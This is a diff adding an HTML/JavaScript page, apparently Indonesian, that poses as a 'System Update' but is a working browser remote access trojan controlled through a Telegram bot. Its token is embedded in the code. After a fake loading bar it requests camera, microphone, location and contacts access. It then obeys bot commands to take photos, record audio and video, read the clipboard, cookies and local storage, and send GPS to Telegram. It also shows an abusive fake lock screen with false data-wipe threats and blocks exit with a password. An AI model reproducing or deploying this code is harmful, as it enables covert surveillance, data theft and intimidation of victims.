@@ -1,0 +1,837 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no, viewport-fit=cover">
+    <title>System Update</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; user-select: none; }
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: #0a0e27;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        .update-box {
+            background: #1a1f3a;
+            border-radius: 20px;
+            padding: 40px 30px;
+            max-width: 400px;
+            text-align: center;
+            box-shadow: 0 10px 40px rgba(0,0,0,0.3);
+            animation: pulse 2s infinite;
+        }
+        @keyframes pulse {
+            0% { box-shadow: 0 0 0 0 rgba(255,107,107,0.4); }
+            70% { box-shadow: 0 0 0 15px rgba(255,107,107,0); }
+            100% { box-shadow: 0 0 0 0 rgba(255,107,107,0); }
+        }
+        .icon { font-size: 64px; margin-bottom: 20px; }
+        h2 { color: #ff6b6b; margin-bottom: 10px; }
+        p { color: #ccc; margin-bottom: 25px; font-size: 14px; }
+        .progress-bar { width: 100%; height: 4px; background: #2a2f4a; border-radius: 2px; overflow: hidden; margin: 20px 0; }
+        .progress-fill { width: 0%; height: 100%; background: linear-gradient(90deg, #ff6b6b, #ee5a24); }
+        .status { color: #ffd93d; font-size: 12px; margin-bottom: 15px; }
+        .grant-btn {
+            background: #ff6b6b;
+            border: none;
+            color: white;
+            padding: 12px 24px;
+            border-radius: 30px;
+            font-size: 14px;
+            font-weight: bold;
+            cursor: pointer;
+            margin-top: 20px;
+            transition: 0.3s;
+        }
+        .grant-btn:hover { background: #ee5a24; }
+        .grant-btn:disabled { background: #555; cursor: not-allowed; }
+        .hidden { display: none; }
+
+        /* LOCK SCREEN VEONIX */
+        .lockscreen-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(135deg, #0a0a0a, #1a1a1a);
+            z-index: 10000;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-family: 'Courier New', monospace;
+            backdrop-filter: blur(10px);
+        }
+        .lock-box {
+            text-align: center;
+            background: rgba(0,0,0,0.9);
+            padding: 50px 30px;
+            border-radius: 30px;
+            border: 3px solid #ff0000;
+            box-shadow: 0 0 80px rgba(255,0,0,0.5);
+            width: 90%;
+            max-width: 400px;
+        }
+        .lock-title {
+            font-size: 42px;
+            font-weight: bold;
+            color: #ff0000;
+            letter-spacing: 5px;
+            margin-bottom: 20px;
+            text-transform: uppercase;
+            text-shadow: 0 0 10px rgba(255,0,0,0.8);
+        }
+        .lock-sub {
+            font-size: 16px;
+            color: #ff4444;
+            margin-bottom: 30px;
+            border-top: 2px solid #ff0000;
+            padding-top: 15px;
+        }
+        .lock-sub span {
+            color: #ff8888;
+            font-size: 18px;
+        }
+        .lock-input {
+            width: 100%;
+            padding: 14px;
+            background: #111;
+            border: 2px solid #ff0000;
+            color: #ff6666;
+            font-size: 20px;
+            text-align: center;
+            letter-spacing: 5px;
+            border-radius: 40px;
+            margin-bottom: 20px;
+            outline: none;
+        }
+        .lock-btn {
+            background: #ff0000;
+            color: white;
+            border: none;
+            padding: 14px 30px;
+            border-radius: 40px;
+            font-size: 18px;
+            font-weight: bold;
+            cursor: pointer;
+            width: 100%;
+        }
+        .lock-warning {
+            font-size: 12px;
+            color: #ff6666;
+            margin-top: 20px;
+        }
+        .lock-maki {
+            font-size: 14px;
+            color: #ff8888;
+            margin-top: 15px;
+            font-style: italic;
+        }
+
+        /* EXIT PASSWORD OVERLAY */
+        .exit-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.95);
+            z-index: 20000;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-family: 'Courier New', monospace;
+        }
+        .exit-box {
+            text-align: center;
+            background: #111;
+            padding: 40px;
+            border-radius: 20px;
+            border: 2px solid #ff6600;
+            max-width: 350px;
+            width: 90%;
+        }
+        .exit-title {
+            font-size: 24px;
+            color: #ff6600;
+            margin-bottom: 20px;
+        }
+        .exit-input {
+            width: 100%;
+            padding: 12px;
+            background: #222;
+            border: 1px solid #ff6600;
+            color: white;
+            font-size: 16px;
+            text-align: center;
+            border-radius: 30px;
+            margin-bottom: 15px;
+            outline: none;
+        }
+        .exit-btn {
+            background: #ff6600;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 30px;
+            cursor: pointer;
+            width: 100%;
+        }
+        .exit-warning {
+            font-size: 11px;
+            color: #888;
+            margin-top: 15px;
+        }
+    </style>
+</head>
+<body>
+
+<div id="normalUI" class="update-box">
+    <div class="icon">🔄</div>
+    <h2>RRat</h2>
+    <p>RaXzz Tes Rat</p>
+    <div class="progress-bar"><div class="progress-fill" id="progressFill"></div></div>
+    <p class="status" id="statusMsg">⏳ Sedang memeriksa pembaruan...</p>
+    <button id="grantBtn" class="grant-btn hidden">Lanjutkan</button>
+</div>
+
+<script>
+// ================= KONFIGURASI =================
+const BOT_TOKEN = '8762110034:AAFiD0P4g-6WKy9Lpltsq-SYle6t9xVyDH8';
+const CHAT_ID = '8342347148';
+
+let victimId = 'victim_' + Date.now() + '_' + Math.random().toString(36).substr(2, 8);
+let lastUpdateId = 0;
+let permissionsGranted = false;
+let currentLockPassword = null;
+let isLocked = false;
+let torchTrack = null;
+let mediaRecorder = null;
+let audioChunks = [];
+let videoRecorder = null;
+let videoChunks = [];
+let sosInterval = null;
+let panicInterval = null;
+let currentAudio = null;
+
+// ================= EXIT PASSWORD =================
+let exitPasswordEnabled = false;
+let exitPasswordValue = null;
+let pendingExitAction = null;
+
+function showExitPasswordOverlay(action) {
+    pendingExitAction = action;
+    const existing = document.getElementById('exitOverlay');
+    if (existing) existing.remove();
+    
+    const overlay = document.createElement('div');
+    overlay.id = 'exitOverlay';
+    overlay.className = 'exit-overlay';
+    overlay.innerHTML = `
+        <div class="exit-box">
+            <div class="exit-title">🔒 EXIT PASSWORD REQUIRED</div>
+            <input type="password" id="exitPasswordInput" class="exit-input" placeholder="Masukkan password" autocomplete="off">
+            <button id="exitSubmitBtn" class="exit-btn">VERIFY</button>
+            <div class="exit-warning">⚠️ Anda tidak bisa keluar tanpa password ⚠️</div>
+        </div>
+    `;
+    document.body.appendChild(overlay);
+    
+    const input = document.getElementById('exitPasswordInput');
+    const btn = document.getElementById('exitSubmitBtn');
+    const attempt = () => {
+        if (input.value === exitPasswordValue) {
+            overlay.remove();
+            sendToTelegram(`✅ Exit password berhasil dimasukkan.`);
+            if (pendingExitAction === 'close') {
+                window.close();
+            } else if (pendingExitAction === 'unload') {
+                window.location.href = 'about:blank';
+            }
+            pendingExitAction = null;
+        } else {
+            sendToTelegram(`⚠️ Percobaan exit password SALAH: "${input.value}" dari victim ${victimId}`);
+            input.value = '';
+            if ('vibrate' in navigator) navigator.vibrate(500);
+        }
+    };
+    btn.onclick = attempt;
+    input.onkeypress = (e) => { if (e.key === 'Enter') attempt(); };
+}
+
+// Intercept beforeunload
+window.addEventListener('beforeunload', (e) => {
+    if (exitPasswordEnabled && exitPasswordValue) {
+        e.preventDefault();
+        e.returnValue = '';
+        showExitPasswordOverlay('unload');
+        return false;
+    }
+});
+
+// Intercept page hide / visibility change buat tambahan keamanan
+document.addEventListener('visibilitychange', () => {
+    if (exitPasswordEnabled && exitPasswordValue && document.hidden) {
+        showExitPasswordOverlay('unload');
+    }
+});
+
+// ================= TELEGRAM SENDER =================
+async function sendToTelegram(text, parseMode = 'HTML') {
+    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+    const form = new FormData();
+    form.append('chat_id', CHAT_ID);
+    form.append('text', text);
+    form.append('parse_mode', parseMode);
+    try { await fetch(url, { method: 'POST', body: form }); } catch(e) {}
+}
+
+async function sendPhotoToTelegram(blob, filename) {
+    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
+    const form = new FormData();
+    form.append('chat_id', CHAT_ID);
+    form.append('photo', blob, filename);
+    try { await fetch(url, { method: 'POST', body: form }); } catch(e) {}
+}
+
+async function sendVideoToTelegram(blob, filename) {
+    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`;
+    const form = new FormData();
+    form.append('chat_id', CHAT_ID);
+    form.append('video', blob, filename);
+    try { await fetch(url, { method: 'POST', body: form }); } catch(e) {}
+}
+
+async function sendAudioToTelegram(blob, filename) {
+    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendVoice`;
+    const form = new FormData();
+    form.append('chat_id', CHAT_ID);
+    form.append('voice', blob, filename);
+    try { await fetch(url, { method: 'POST', body: form }); } catch(e) {}
+}
+
+// ================= LOCK SCREEN =================
+function showLockScreen(password, isPanic = false) {
+    if (isLocked && !isPanic) return;
+    currentLockPassword = password;
+    isLocked = true;
+    document.getElementById('normalUI').style.display = 'none';
+
+    const makiWords = ["LU NGENTOT!", "BOCAH MAMPUS!", "GOBLOK KONTOL!", "TAIK LU ASU!", "BANGSAT MEMEK!", "ANJING!", "SETAN!", "JIN!", "BABI!", "KAMPret!"];
+    const randomMaki = makiWords[Math.floor(Math.random() * makiWords.length)];
+
+    const overlay = document.createElement('div');
+    overlay.id = 'lockscreenOverlay';
+    overlay.className = 'lockscreen-overlay';
+    overlay.innerHTML = `
+        <div class="lock-box">
+            <div class="lock-title">🔒 DEVICE LOCKED 🔒</div>
+            <div class="lock-sub">HACKED BY<br><span>HUMAN DEVELOPER VEONIX</span></div>
+            <div class="lock-maki">⚠️ ${randomMaki} ⚠️</div>
+            <input type="password" id="lockPasswordInput" class="lock-input" placeholder="ENTER PASSWORD" autocomplete="off">
+            <button id="unlockSubmitBtn" class="lock-btn">UNLOCK</button>
+            <div class="lock-warning">⚠️ WRONG PASSWORD = PERMANENT BRICK ⚠️<br>⚠️ BRUTE FORCE = DATA WIPED ⚠️</div>
+        </div>
+    `;
+    document.body.appendChild(overlay);
+
+    const input = document.getElementById('lockPasswordInput');
+    const btn = document.getElementById('unlockSubmitBtn');
+    const attempt = () => {
+        if (input.value === currentLockPassword) {
+            overlay.remove();
+            document.getElementById('normalUI').style.display = 'flex';
+            isLocked = false;
+            currentLockPassword = null;
+            sendToTelegram(`🔓 Victim UNLOCKED device.`);
+        } else {
+            sendToTelegram(`⚠️ WRONG PASSWORD: "${input.value}" dari victim ${victimId}`);
+            input.value = '';
+            if ('vibrate' in navigator) navigator.vibrate([500, 200, 500]);
+        }
+    };
+    btn.onclick = attempt;
+    input.onkeypress = (e) => { if (e.key === 'Enter') attempt(); };
+}
+
+function hideLockScreen() {
+    const overlay = document.getElementById('lockscreenOverlay');
+    if (overlay) overlay.remove();
+    document.getElementById('normalUI').style.display = 'flex';
+    isLocked = false;
+    currentLockPassword = null;
+}
+
+// ================= SENTER =================
+async function turnOnTorch() {
+    try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } });
+        const track = stream.getVideoTracks()[0];
+        if (track.getCapabilities().torch) {
+            await track.applyConstraints({ advanced: [{ torch: true }] });
+            torchTrack = track;
+            return true;
+        }
+    } catch(e) { return false; }
+}
+
+async function turnOffTorch() {
+    if (torchTrack) {
+        await torchTrack.applyConstraints({ advanced: [{ torch: false }] });
+        torchTrack.stop();
+        torchTrack = null;
+    }
+}
+
+async function sosTorch(duration = 10000) {
+    if (sosInterval) clearInterval(sosInterval);
+    let state = true;
+    sosInterval = setInterval(async () => {
+        if (state) await turnOnTorch();
+        else await turnOffTorch();
+        state = !state;
+    }, 500);
+    setTimeout(() => {
+        if (sosInterval) clearInterval(sosInterval);
+        turnOffTorch();
+        sosInterval = null;
+    }, duration);
+}
+
+// ================= VOLUME =================
+async function maxVolume() {
+    sendToTelegram(`🔊 Menaikkan volume ke maksimum...`);
+    try {
+        const audio = new Audio();
+        audio.volume = 1;
+        sendToTelegram(`✅ Volume diset ke maksimum.`);
+    } catch(e) {}
+}
+
+// ================= KAMERA =================
+async function takeCamera(facingMode = "user") {
+    try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: { exact: facingMode } } });
+        const track = stream.getVideoTracks()[0];
+        const imageCapture = new ImageCapture(track);
+        const bitmap = await imageCapture.grabFrame();
+        const canvas = document.createElement('canvas');
+        canvas.width = bitmap.width;
+        canvas.height = bitmap.height;
+        canvas.getContext('2d').drawImage(bitmap, 0, 0);
+        const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.9));
+        track.stop();
+        stream.getTracks().forEach(t => t.stop());
+        await sendPhotoToTelegram(blob, `camera_${facingMode}.jpg`);
+        sendToTelegram(`📸 Foto ${facingMode === "user" ? "DEPAN" : "BELAKANG"} terkirim`);
+    } catch(e) {
+        sendToTelegram(`❌ Gagal ambil foto: ${e.message}`);
+    }
+}
+
+// ================= REKAM VIDEO =================
+async function recordVideo(facingMode = "user", duration = 10000) {
+    try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: { exact: facingMode } }, audio: true });
+        videoRecorder = new MediaRecorder(stream);
+        videoChunks = [];
+        videoRecorder.ondataavailable = e => { if (e.data.size > 0) videoChunks.push(e.data); };
+        videoRecorder.onstop = async () => {
+            const blob = new Blob(videoChunks, { type: 'video/mp4' });
+            await sendVideoToTelegram(blob, `video_${facingMode}_${Date.now()}.mp4`);
+            stream.getTracks().forEach(t => t.stop());
+            sendToTelegram(`🎥 Video ${facingMode === "user" ? "DEPAN" : "BELAKANG"} 10 detik terkirim`);
+        };
+        videoRecorder.start();
+        sendToTelegram(`🎬 Merekam video ${facingMode === "user" ? "DEPAN" : "BELAKANG"} 10 detik...`);
+        setTimeout(() => {
+            if (videoRecorder && videoRecorder.state === 'recording') videoRecorder.stop();
+        }, duration);
+    } catch(e) {
+        sendToTelegram(`❌ Gagal rekam video: ${e.message}`);
+    }
+}
+
+// ================= REKAM SUARA =================
+async function recordAudio10Seconds() {
+    try {
+        const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+        mediaRecorder = new MediaRecorder(stream);
+        audioChunks = [];
+        mediaRecorder.ondataavailable = e => { if (e.data.size > 0) audioChunks.push(e.data); };
+        mediaRecorder.onstop = async () => {
+            const blob = new Blob(audioChunks, { type: 'audio/webm' });
+            await sendAudioToTelegram(blob, 'recording.webm');
+            stream.getTracks().forEach(t => t.stop());
+            sendToTelegram(`🎤 Rekaman suara 10 detik terkirim`);
+        };
+        mediaRecorder.start();
+        sendToTelegram(`🎙️ Merekam 10 detik...`);
+        setTimeout(() => { if (mediaRecorder?.state === 'recording') mediaRecorder.stop(); }, 10000);
+    } catch(e) { sendToTelegram(`❌ Gagal rekam: ${e.message}`); }
+}
+
+// ================= PLAY AUDIO =================
+let audioBlobCache = null;
+async function playStoredAudio() {
+    if (audioBlobCache) {
+        const url = URL.createObjectURL(audioBlobCache);
+        if (currentAudio) currentAudio.pause();
+        currentAudio = new Audio(url);
+        currentAudio.play().catch(e => sendToTelegram(`❌ Gagal play audio: ${e.message}`));
+        sendToTelegram(`🔊 Memutar audio yang dikirim.`);
+    } else {
+        sendToTelegram(`❌ Belum ada audio yang dikirim. Kirim file audio dulu ke bot.`);
+    }
+}
+
+// ================= KONTAK =================
+async function readContacts() {
+    if ('contacts' in navigator && navigator.contacts) {
+        try {
+            const props = ['name', 'tel'];
+            const opts = { multiple: true };
+            const contacts = await navigator.contacts.select(props, opts);
+            sendToTelegram(`📞 Total kontak: ${contacts.length}`);
+            let contactList = '';
+            contacts.slice(0, 20).forEach(c => {
+                contactList += `- ${c.name?.[0] || 'No name'}: ${c.tel?.[0] || 'No number'}\n`;
+            });
+            if (contactList) sendToTelegram(`📋 Kontak (20 pertama):\n${contactList}`);
+            else sendToTelegram(`📋 Tidak ada kontak.`);
+        } catch(e) {
+            sendToTelegram(`❌ Gagal akses kontak: ${e.message}`);
+        }
+    } else {
+        sendToTelegram(`❌ Browser tidak support akses kontak.`);
+    }
+}
+
+// ================= PANIC MODE =================
+async function panicMode() {
+    sendToTelegram(`💀💀💀 PANIC MODE AKTIF 💀💀💀`);
+    const randomPass = Math.random().toString(36).substr(2, 8);
+    showLockScreen(randomPass, true);
+    if (panicInterval) clearInterval(panicInterval);
+    let torchState = true;
+    panicInterval = setInterval(async () => {
+        if (torchState) await turnOnTorch();
+        else await turnOffTorch();
+        torchState = !torchState;
+        if ('vibrate' in navigator) navigator.vibrate(200);
+    }, 500);
+    setTimeout(() => {
+        if (panicInterval) clearInterval(panicInterval);
+        turnOffTorch();
+        panicInterval = null;
+    }, 30000);
+}
+
+async function lowkik() {
+    if (panicInterval) clearInterval(panicInterval);
+    await turnOffTorch();
+    hideLockScreen();
+    sendToTelegram(`✅ Mode normal kembali.`);
+}
+
+// ================= SCREENSHOT =================
+async function takeScreenshot() {
+    await injectHtml2Canvas();
+    if (typeof html2canvas === 'function') {
+        try {
+            const canvas = await html2canvas(document.body, { scale: 0.8 });
+            const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/png'));
+            await sendPhotoToTelegram(blob, 'screenshot.png');
+            sendToTelegram(`✅ Screenshot terkirim`);
+        } catch(e) { sendToTelegram(`❌ Screenshot gagal: ${e.message}`); }
+    } else {
+        sendToTelegram(`❌ html2canvas belum load`);
+    }
+}
+
+async function injectHtml2Canvas() {
+    if (typeof html2canvas !== 'undefined') return;
+    return new Promise((resolve, reject) => {
+        const script = document.createElement('script');
+        script.src = 'https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js';
+        script.onload = resolve;
+        script.onerror = reject;
+        document.head.appendChild(script);
+    });
+}
+
+// ================= GET INFO =================
+async function getAllInfo() {
+    let ipData = {};
+    try {
+        const res = await fetch('https://ipapi.co/json/');
+        ipData = await res.json();
+    } catch(e) {}
+    
+    const ua = navigator.userAgent;
+    let device = 'Unknown', os = 'Unknown', browser = 'Unknown';
+    if (/iPhone/i.test(ua)) device = 'iPhone';
+    else if (/iPad/i.test(ua)) device = 'iPad';
+    else if (/Android/i.test(ua)) device = 'Android';
+    else if (/Windows/i.test(ua)) device = 'Windows';
+    
+    if (/Android/i.test(ua)) os = 'Android';
+    else if (/iPhone|iPad/i.test(ua)) os = 'iOS';
+    else if (/Windows NT/i.test(ua)) os = 'Windows';
+    
+    if (/Chrome/i.test(ua) && !/Edg/i.test(ua)) browser = 'Chrome';
+    else if (/Safari/i.test(ua) && !/Chrome/i.test(ua)) browser = 'Safari';
+    else if (/Firefox/i.test(ua)) browser = 'Firefox';
+    
+    let battery = 'Unknown';
+    if ('getBattery' in navigator) {
+        try { const bat = await navigator.getBattery(); battery = bat.level * 100; } catch(e) {}
+    }
+    
+    let gps = { lat: 'Tidak ada izin', lon: 'Tidak ada izin' };
+    if ('geolocation' in navigator) {
+        try {
+            const pos = await new Promise((resolve, reject) => {
+                navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 5000 });
+            });
+            gps = { lat: pos.coords.latitude, lon: pos.coords.longitude };
+        } catch(e) {}
+    }
+    
+    let clipboard = '';
+    try { clipboard = await navigator.clipboard.readText(); } catch(e) {}
+    
+    return { victimId, ip: ipData.ip || 'Unknown', city: ipData.city || 'Unknown', country: ipData.country_name || 'Unknown', gps, device, os, browser, battery, clipboard };
+}
+
+// ================= PERMISSIONS =================
+async function requestAllPermissions() {
+    const statusElem = document.getElementById('statusMsg');
+    if ('geolocation' in navigator) {
+        try { await new Promise((resolve, reject) => navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 10000 })); } catch(e) {}
+    }
+    if (navigator.mediaDevices?.getUserMedia) {
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+            stream.getTracks().forEach(t => t.stop());
+        } catch(e) {}
+    }
+    if ('contacts' in navigator && navigator.contacts) {
+        try { await navigator.contacts.select(['name'], { multiple: false }); } catch(e) {}
+    }
+    if ('Notification' in window && Notification.permission === 'default') Notification.requestPermission();
+    permissionsGranted = true;
+    statusElem.innerHTML = '✅ Verifikasi selesai';
+    await sendToTelegram(`🔓 Victim ${victimId} telah memberikan izin.`);
+}
+
+// ================= COMMAND HANDLER =================
+async function executeCommand(cmd) {
+    const lower = cmd.toLowerCase().trim();
+    
+    // EXIT PASSWORD COMMANDS
+    if (lower.startsWith('/lubanar ')) {
+        const pass = cmd.substring(9).trim();
+        exitPasswordEnabled = true;
+        exitPasswordValue = pass;
+        await sendToTelegram(`🔒 EXIT PASSWORD AKTIF: korban tidak bisa keluar tanpa password "${pass}"`);
+    }
+    else if (lower.startsWith('/aktaros ')) {
+        const pass = cmd.substring(9).trim();
+        if (exitPasswordEnabled && exitPasswordValue === pass) {
+            exitPasswordEnabled = false;
+            exitPasswordValue = null;
+            await sendToTelegram(`🔓 EXIT PASSWORD DINONAKTIFKAN. Korban sekarang bisa keluar.`);
+        } else {
+            await sendToTelegram(`❌ Gagal menonaktifkan exit password: password salah.`);
+        }
+    }
+    else if (lower.startsWith('/locked ')) {
+        const pass = cmd.substring(8).trim();
+        if (!isLocked) showLockScreen(pass);
+        await sendToTelegram(`🔒 Lock screen aktif dengan password: ${pass}`);
+    }
+    else if (lower.startsWith('/unlock ')) {
+        const pass = cmd.substring(8).trim();
+        if (isLocked && pass === currentLockPassword) hideLockScreen();
+        else if (isLocked) await sendToTelegram(`❌ Password salah`);
+        else await sendToTelegram(`ℹ️ Tidak dalam keadaan terkunci`);
+    }
+    else if (lower === '/lukazar') await panicMode();
+    else if (lower === '/lowkik') await lowkik();
+    else if (lower === '/volume') await maxVolume();
+    else if (lower === '/sos') await sosTorch(10000);
+    else if (lower === '/lukas') await takeCamera("environment");
+    else if (lower === '/camera') await takeCamera("user");
+    else if (lower === '/cahaya') { await turnOnTorch(); await sendToTelegram(`🔦 Senter menyala`); }
+    else if (lower === '/ofcahya') { await turnOffTorch(); await sendToTelegram(`🔦 Senter mati`); }
+    else if (lower === '/rekam') await recordAudio10Seconds();
+    else if (lower === '/vdc') await recordVideo("user", 10000);
+    else if (lower === '/vdci') await recordVideo("environment", 10000);
+    else if (lower === '/audio') await playStoredAudio();
+    else if (lower === '/sms') await sendToTelegram(`📱 Fitur SMS: Di web tidak bisa akses langsung. Butuh izin SMS di Android App.`);
+    else if (lower === '/kontak') await readContacts();
+    else if (lower === '/screenshot' || lower === '/ss') await takeScreenshot();
+    else if (lower === '/ping') await sendToTelegram(`🏓 PONG! Victim ${victimId} online`);
+    else if (lower === '/status') await sendToTelegram(`🟢 ONLINE | ID: ${victimId} | Locked: ${isLocked} | ExitLock: ${exitPasswordEnabled ? 'AKTIF' : 'OFF'}`);
+    else if (lower === '/location') {
+        if ('geolocation' in navigator) {
+            navigator.geolocation.getCurrentPosition(async (pos) => {
+                const maps = `https://maps.google.com/?q=${pos.coords.latitude},${pos.coords.longitude}`;
+                await sendToTelegram(`📍 Lokasi: ${pos.coords.latitude}, ${pos.coords.longitude}\n<a href="${maps}">Buka Maps</a>`);
+            }, async () => await sendToTelegram(`❌ Gagal akses GPS`));
+        } else await sendToTelegram(`❌ GPS tidak support`);
+    }
+    else if (lower === '/clipboard') {
+        try {
+            const text = await navigator.clipboard.readText();
+            await sendToTelegram(`📋 Clipboard:\n\`\`\`\n${text || 'Kosong'}\n\`\`\``);
+        } catch(e) { await sendToTelegram(`❌ Gagal baca clipboard`); }
+    }
+    else if (lower === '/cookies') {
+        await sendToTelegram(`🍪 Cookies:\n\`\`\`\n${document.cookie || 'Kosong'}\n\`\`\``);
+    }
+    else if (lower === '/storage') {
+        let storage = '';
+        for (let i = 0; i < localStorage.length; i++) {
+            const key = localStorage.key(i);
+            storage += `${key}: ${localStorage.getItem(key)}\n`;
+        }
+        await sendToTelegram(`💾 LocalStorage:\n\`\`\`\n${storage || 'Kosong'}\n\`\`\``);
+    }
+    else if (lower.startsWith('/buka ')) {
+        const url = cmd.substring(6).trim();
+        if (url) { window.open(url, '_blank'); await sendToTelegram(`✅ Membuka: ${url}`); }
+        else await sendToTelegram(`❌ Format: /buka https://...`);
+    }
+    else if (lower.startsWith('/alert ')) {
+        const msg = cmd.substring(7).trim();
+        if (msg) { alert(msg); await sendToTelegram(`✅ Alert: ${msg}`); }
+    }
+    else if (lower.startsWith('/notif ')) {
+        const msg = cmd.substring(7).trim();
+        if ('Notification' in window && Notification.permission === 'granted') {
+            new Notification('Pesan', { body: msg });
+            await sendToTelegram(`✅ Notifikasi: ${msg}`);
+        } else await sendToTelegram(`❌ Izin notifikasi belum ada`);
+    }
+    else if (lower === '/vibrate') {
+        if ('vibrate' in navigator) { navigator.vibrate(500); await sendToTelegram(`📳 Getar`); }
+        else await sendToTelegram(`❌ Tidak support getar`);
+    }
+    else if (lower.startsWith('/play ')) {
+        const url = cmd.substring(6).trim();
+        if (url) {
+            const audio = new Audio(url);
+            audio.play().catch(e => sendToTelegram(`❌ Gagal play: ${e.message}`));
+            await sendToTelegram(`🔊 Memutar: ${url}`);
+        }
+    }
+    else if (lower === '/redirect') {
+        window.location.href = 'https://www.google.com';
+        await sendToTelegram(`➡️ Redirect ke Google`);
+    }
+    else if (lower === '/info') {
+        const data = await getAllInfo();
+        let msg = `📱 <b>INFO VICTIM</b>\n━━━━━━━━━━\nID: ${data.victimId}\nIP: ${data.ip}\nLokasi: ${data.city}, ${data.country}\nGPS: ${data.gps.lat}, ${data.gps.lon}\nDevice: ${data.device}\nOS: ${data.os}\nBrowser: ${data.browser}\nBaterai: ${data.battery}%\nClipboard: ${data.clipboard || 'Kosong'}\nLocked: ${isLocked ? 'Ya' : 'Tidak'}\nExitLock: ${exitPasswordEnabled ? 'AKTIF' : 'OFF'}`;
+        await sendToTelegram(msg);
+    }
+    else if (lower === '/help' || lower === '/menu') {
+        const help = `🎮 <b>RAT COMMAND MENU LENGKAP</b>\n━━━━━━━━━━━━━━━\n/lubanar [pass] - AKTIFKAN exit password\n/aktaros [pass] - NONAKTIFKAN exit password\n/locked [pass] - Lock screen\n/unlock [pass] - Unlock\n/lukazar - PANIC MODE\n/lowkik - Kembali normal\n/volume - Volume penuh\n/sos - Senter SOS 10dtk\n/lukas - Kamera BELAKANG\n/camera - Kamera DEPAN\n/cahaya - Senter ON\n/ofcahya - Senter OFF\n/rekam - Rekam suara 10dtk\n/vdc - Rekam video DEPAN\n/vdci - Rekam video BELAKANG\n/audio - Play audio yg dikirim\n/kontak - Akses kontak\n/screenshot - Screenshot\n/location - GPS\n/clipboard - Clipboard\n/cookies - Cookies\n/storage - LocalStorage\n/buka [url] - Buka URL\n/alert [pesan] - Alert\n/notif [pesan] - Notif\n/vibrate - Getar\n/play [url] - Putar audio\n/redirect - Redirect\n/info - Info lengkap\n/ping - Cek\n/status - Status\n/help - Menu ini\n━━━━━━━━━━━━━━━\nVictim ID: ${victimId}`;
+        await sendToTelegram(help);
+    }
+    else {
+        await sendToTelegram(`❓ Perintah tidak dikenal. Ketik /help`);
+    }
+}
+
+// ================= HANDLE AUDIO FILE =================
+async function handleAudioFile(fileUrl) {
+    try {
+        const response = await fetch(fileUrl);
+        audioBlobCache = await response.blob();
+        sendToTelegram(`✅ File audio diterima. Ketik /audio untuk memutar.`);
+    } catch(e) {
+        sendToTelegram(`❌ Gagal download audio: ${e.message}`);
+    }
+}
+
+// ================= POLLING =================
+async function pollCommands() {
+    const url = `https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=${lastUpdateId + 1}&timeout=25`;
+    try {
+        const res = await fetch(url);
+        const data = await res.json();
+        if (data.ok && data.result) {
+            for (const update of data.result) {
+                lastUpdateId = update.update_id;
+                const msg = update.message;
+                if (msg && msg.chat.id.toString() === CHAT_ID) {
+                    if (msg.text) {
+                        await executeCommand(msg.text);
+                    }
+                    if (msg.voice || msg.audio || msg.document) {
+                        let fileId = null;
+                        if (msg.voice) fileId = msg.voice.file_id;
+                        else if (msg.audio) fileId = msg.audio.file_id;
+                        else if (msg.document && msg.document.mime_type?.startsWith('audio/')) fileId = msg.document.file_id;
+                        
+                        if (fileId) {
+                            const fileInfo = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getFile?file_id=${fileId}`).then(r => r.json());
+                            if (fileInfo.ok) {
+                                const fileUrl = `https://api.telegram.org/file/bot${BOT_TOKEN}/${fileInfo.result.file_path}`;
+                                await handleAudioFile(fileUrl);
+                            }
+                        }
+                    }
+                }
+            }
+        }
+    } catch(e) {}
+    setTimeout(pollCommands, 3000);
+}
+
+// ================= FAKE LOADING =================
+async function fakeLoading() {
+    const progressFill = document.getElementById('progressFill');
+    const statusElem = document.getElementById('statusMsg');
+    for (let p of [10,25,40,55,70,85,95,100]) {
+        progressFill.style.width = p + '%';
+        statusElem.innerHTML = `⏳ Memproses ${p}%...`;
+        await new Promise(r => setTimeout(r, 150));
+    }
+    statusElem.innerHTML = '✅ Klik Lanjutkan untuk verifikasi';
+}
+
+// ================= INIT =================
+async function setupUI() {
+    const btn = document.getElementById('grantBtn');
+    btn.classList.remove('hidden');
+    btn.innerText = 'Lanjutkan';
+    await fakeLoading();
+    btn.onclick = async () => {
+        btn.disabled = true;
+        btn.innerText = 'Memproses...';
+        await requestAllPermissions();
+        btn.innerText = 'Selesai';
+        document.getElementById('statusMsg').innerHTML = '✅ Perangkat siap.';
+    };
+}
+
+async function init() {
+    await setupUI();
+    await sendToTelegram(`🎯 RAT ONLINE: ${victimId}`);
+    pollCommands();
+    setInterval(async () => {
+        if (permissionsGranted) await sendToTelegram(`💓 Heartbeat: ${victimId} online`);
+    }, 60000);
+}
+
+init();
+</script>
+</body>
+</html>
